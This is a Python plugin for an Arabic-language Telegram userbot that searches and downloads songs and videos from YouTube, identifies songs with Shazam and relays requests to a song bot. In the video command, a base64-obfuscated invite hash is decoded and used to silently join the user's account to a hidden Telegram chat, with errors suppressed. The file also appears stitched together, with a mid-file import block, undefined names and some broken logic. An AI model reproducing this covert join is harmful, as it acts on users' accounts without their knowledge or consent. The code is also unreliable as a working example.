import asyncio
import base64
import io
import urllib.parse
import os
import yt_dlp
import re
from pathlib import Path

from ShazamAPI import Shazam
from telethon import types
from telethon.errors.rpcerrorlist import YouBlockedUserError, ChatSendMediaForbiddenError
from telethon.tl.functions.contacts import UnblockRequest as unblock
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from validators.url import url

from ..core.logger import logging
from ..core.managers import edit_delete, edit_or_reply
from ..helpers.functions import delete_conv
from ..helpers.tools import media_type
from ..helpers.utils import _catutils, reply_id
from . import l313l

plugin_category = "utils"
LOGS = logging.getLogger(__name__)

# =========================================================== #
#                           STRINGS                           #
# =========================================================== #
SONG_SEARCH_STRING = "<code>يجؤة الانتظار قليلا يتم البحث على المطلوب</code>"
SONG_NOT_FOUND = "<code>عذرا لا يمكنني ايجاد اي اغنيه مثل هذه</code>"
SONG_SENDING_STRING = "<code>جارِ الارسال انتظر قليلا...</code>"
# =========================================================== #
#                       HELPER FUNCTIONS                      #
# =========================================================== #

async def yt_search(query):
    """البحث في يوتيوب وإرجاع رابط أول فيديو"""
    try:
        ydl_opts = {
            'quiet': True,
            'no_warnings': True,
            'extractflat': True,
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            search_results = ydl.extract_info(
                f"ytsearch1:{query}",
                download=False
            )
            if search_results and 'entries' in search_results and search_results['entries']:
                video_id = search_results['entries'][0]['id']
                return f"https://www.youtube.com/watch?v={video_id}"
    except Exception as e:
        LOGS.error(f"خطأ في البحث: {e}")
    return None

async def download_song(video_url, quality="128"):
    """تحميل الأغنية من يوتيوب"""
    try:
        temp_dir = "./temp"
        os.makedirs(temp_dir, exist_ok=True)
        
        ydl_opts = {
            'format': 'bestaudio/best',
            'outtmpl': f'{temp_dir}/%(title)s.%(ext)s',
            'postprocessors': [{
                'key': 'FFmpegExtractAudio',
                'preferredcodec': 'mp3',
                'preferredquality': quality,
            }],
            'quiet': True,
            'no_warnings': True,
        }
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(video_url, download=True)
            title = info.get('title', 'Unknown')
            # تنظيف اسم الملف
            clean_title = re.sub(r'[<>:"/\\|?*]', '_', title)
            audio_file = f"{temp_dir}/{clean_title}.mp3"
            thumbnail_file = f"{temp_dir}/{clean_title}.jpg"
            
            # تحميل الصورة المصغرة
            if info.get('thumbnail'):
                ydl_thumb_opts = {
                    'writethumbnail': True,
                    'outtmpl': f'{temp_dir}/%(title)s.%(ext)s',
                    'quiet': True,
                    'skip_download': True,
                }
                with yt_dlp.YoutubeDL(ydl_thumb_opts) as ydl_thumb:
                    ydl_thumb.download([video_url])
            
            return audio_file, thumbnail_file, clean_title
    except Exception as e:
        LOGS.error(f"خطأ في تحميل الأغنية: {e}")
        return None, None, None

async def download_video(video_url):
    """تحميل الفيديو من يوتيوب"""
    try:
        temp_dir = "./temp"
        os.makedirs(temp_dir, exist_ok=True)
        
        ydl_opts = {
            'format': 'best[height<=720]/best',
            'outtmpl': f'{temp_dir}/%(title)s.%(ext)s',
            'quiet': True,
            'no_warnings': True,
        }
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(video_url, download=True)
            title = info.get('title', 'Unknown')
            # تنظيف اسم الملف
            clean_title = re.sub(r'[<>:"/\\|?*]', '_', title)
            
            # البحث عن الملف المحمل
            for ext in ['mp4', 'mkv', 'webm']:
                video_file = f"{temp_dir}/{clean_title}.{ext}"
                if os.path.exists(video_file):
                    break
            else:
                video_file = None
                
            thumbnail_file = f"{temp_dir}/{clean_title}.jpg"
            
            # تحميل الصورة المصغرة
            if info.get('thumbnail'):
                ydl_thumb_opts = {
                    'writethumbnail': True,
                    'outtmpl': f'{temp_dir}/%(title)s.%(ext)s',
                    'quiet': True,
                    'skip_download': True,
                }
                with yt_dlp.YoutubeDL(ydl_thumb_opts) as ydl_thumb:
                    ydl_thumb.download([video_url])
            
            return video_file, thumbnail_file, clean_title
    except Exception as e:
        LOGS.error(f"خطأ في تحميل الفيديو: {e}")
        return None, None, None

# =========================================================== #

import os
import time
import requests
from yt_dlp import YoutubeDL
from youtube_search import YoutubeSearch

def time_to_seconds(time_str):
    parts = time_str.strip().split(':')
    parts = list(map(int, parts))
    if len(parts) == 3:
        return parts[0] * 3600 + parts[1] * 60 + parts[2]
    elif len(parts) == 2:
        return parts[0] * 60 + parts[1]
    elif len(parts) == 1:
        return parts[0]
    return 0

@l313l.on(admin_cmd(pattern="بحث"))
async def handler(event):
    text = event.message.text
    chat_id = event.chat_id
    user_id = event.sender_id
    try:
        query = text.split(None, 1)[1]
    except IndexError:
        return await event.reply("⌔︙أكتب اسم الأغنية بعد الأمر")

    joker_hussein = f"**⌔︙ اصبر عمري، انزلك الأغنية الي طلبتها `{query}`**"
    wait_message = await event.edit(joker_hussein)

    try:
        results = YoutubeSearch(query, max_results=1).to_dict()
        res = results[0]
        title = res['title']
        video_id = res['id']
        duration = int(time_to_seconds(res['duration']))
        duration_string = time.strftime('%M:%S', time.gmtime(duration))

        if duration > 1500:
            return await event.edit("**⌔︙ صوت فوك 25 دقيقة ما اكدر انزله**")

        url = f'https://youtu.be/{video_id}'
        ydl_opts = {
            "format": "bestaudio[ext=m4a]",
            "forceduration": True,
"cookiefile": "cookies.txt"
        }

        with YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            audio_file = ydl.prepare_filename(info)

            if audio_file.endswith('.m4a'):
                new_audio_file = audio_file.replace('.m4a', '.mp3')
                os.rename(audio_file, new_audio_file)
                audio_file = new_audio_file

            title = info.get('title', 'عنوان غير متوفر')
            length = info.get('duration', 0)
            duration_string = time.strftime('%M:%S', time.gmtime(length))

            thumb_url = info.get('thumbnail', '')
            thumb_path = ''
            if thumb_url:
                response = requests.get(thumb_url)
                if response.status_code == 200:
                    safe_title = title.replace("/", "-").replace("\\", "-")
                    thumb_path = f"{safe_title}.jpg"
                    with open(thumb_path, 'wb') as f:
                        f.write(response.content)

            if thumb_path and os.path.exists(thumb_path):
                await event.client.send_file(
                    chat_id,
                    audio_file,
                    title=title,
                    thumb=thumb_path,
                    caption=f'@aljokeruserbot ~ {duration_string} ⏳',
                )
            else:
                await event.client.send_file(
                    chat_id,
                    audio_file,
                    title=title,
                    caption=f'@aljokeruserbot ~ {duration_string} ⏳',
                )

            os.remove(audio_file)
            if thumb_path:
                os.remove(thumb_path)

            await wait_message.delete()

    except Exception as e:
        await wait_message.delete()
        return await event.reply(f"حدث خطأ: {e}")


@l313l.ar_cmd(
    pattern="فيديو(?:\s|$)([\s\S]*)",
    command=("فيديو", plugin_category),
    info={
        "header": "To get video songs from youtube.",
        "description": "Basically this command searches youtube and sends the first video",
        "usage": "{tr}vsong <song name>",
        "examples": "{tr}vsong memories song",
    },
)
async def _(event):
    "To search video songs"
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(1):
        query = event.pattern_match.group(1)
    elif reply and reply.message:
        query = reply.message
    else:
        return await edit_or_reply(event, "⌔∮ يرجى الرد على ما تريد البحث عنه")
    cat = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    catevent = await edit_or_reply(event, "⌔∮ جاري البحث عن المطلوب انتظر")
    video_link = await yt_search(str(query))
    if not video_link:
        return await catevent.edit(
            f"⌔∮ عذرا لم استطع ايجاد مقاطع ذات صلة بـ `{query}`"
        )
    
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    
    await catevent.edit("⌔∮ جاري تحميل الفيديو انتظر...")
    vsong_file, catthumb, title = await download_video(video_link)
    
    if not vsong_file or not os.path.exists(vsong_file):
        return await catevent.edit(
            f"⌔∮ عذرا لم استطع تحميل الفيديو `{query}`"
        )
    
    await catevent.edit("**⌔∮ جاري الارسال انتظر قليلا**")
    
    # التحقق من وجود الصورة المصغرة
    if catthumb and not os.path.exists(catthumb):
        catthumb = None
    await event.client.send_file(
        event.chat_id,
        vsong_file,
        caption=f"**Title:** `{title}`",
        thumb=catthumb,
        supports_streaming=True,
        reply_to=reply_to_id,
    )
    await catevent.delete()
    for files in (catthumb, vsong_file):
        if files and os.path.exists(files):
            os.remove(files)


@l313l.ar_cmd(pattern="اسم الاغنية$")
async def shazamcmd(event):
    reply = await event.get_reply_message()
    mediatype = media_type(reply)
    if not reply or not mediatype or mediatype not in ["Voice", "Audio"]:
        return await edit_delete(
            event, "⌔∮ يرجى الرد على مقطع صوتي او بصمه للبحث عنها"
        )
    catevent = await edit_or_reply(event, "**⌔∮ يتم معالجه المقطع الصوتي  .**")
    try:
        for attr in getattr(reply.document, "attributes", []):
            if isinstance(attr, types.DocumentAttributeFilename):
                name = attr.file_name
        dl = io.FileIO(name, "a")
        await event.client.fast_download_file(
            location=reply.document,
            out=dl,
        )
        dl.close()
        mp3_fileto_recognize = open(name, "rb").read()
        shazam = Shazam(mp3_fileto_recognize)
        recognize_generator = shazam.recognizeSong()
        track = next(recognize_generator)[1]["track"]
    except Exception as e:
        LOGS.error(e)
        return await edit_delete(
            catevent, f"**⌔∮ لقد حدث خطأ ما اثناء البحث عن اسم الاغنيه:**\n__{e}__"
        )

    image = track["images"]["background"]
    song = track["share"]["subject"]
    await event.client.send_file(
        event.chat_id, image, caption=f"**الاغنية:** `{song}`", reply_to=reply
    )
    await catevent.delete()


@l313l.ar_cmd(
    pattern="بحث2(?:\s|$)([\s\S]*)",
    command=("بحث2", plugin_category),
    info={
        "header": "To search songs and upload to telegram",
        "description": "Searches the song you entered in query and sends it quality of it is 320k",
        "usage": "{tr}song2 <song name>",
        "examples": "{tr}song2 memories song",
    },
)
async def _(event):
    "To search songs"
    song = event.pattern_match.group(1)
    chat = "@songdl_bot"
    reply_id_ = await reply_id(event)
    catevent = await edit_or_reply(event, SONG_SEARCH_STRING, parse_mode="html")
    async with event.client.conversation(chat) as conv:
        try:
            purgeflag = await conv.send_message("/start")
        except YouBlockedUserError:
            await edit_or_reply(
                catevent, "**Error:** Trying to unblock & retry, wait a sec..."
            )
            await catub(unblock("songdl_bot"))
            purgeflag = await conv.send_message("/start")
        await conv.get_response()
        await conv.send_message(song)
        hmm = await conv.get_response()
        while hmm.edit_hide is not True:
            await asyncio.sleep(0.1)
            hmm = await event.client.get_messages(chat, ids=hmm.id)
        baka = await event.client.get_messages(chat)
        if baka[0].message.startswith(
            ("I don't like to say this but I failed to find any such song.")
        ):
            await delete_conv(event, chat, purgeflag)
            return await edit_delete(
                catevent, SONG_NOT_FOUND, parse_mode="html", time=5
            )
        await catevent.edit(SONG_SENDING_STRING, parse_mode="html")
        await baka[0].click(0)
        await conv.get_response()
        await conv.get_response()
        music = await conv.get_response()
        await event.client.send_read_acknowledge(conv.chat_id)
        await event.client.send_file(
            event.chat_id,
            music,
            caption=f"<b>Title :- <code>{song}</code></b>",
            parse_mode="html",
            reply_to=reply_id_,
        )
        await catevent.delete()
        await delete_conv(event, chat, purgeflag)

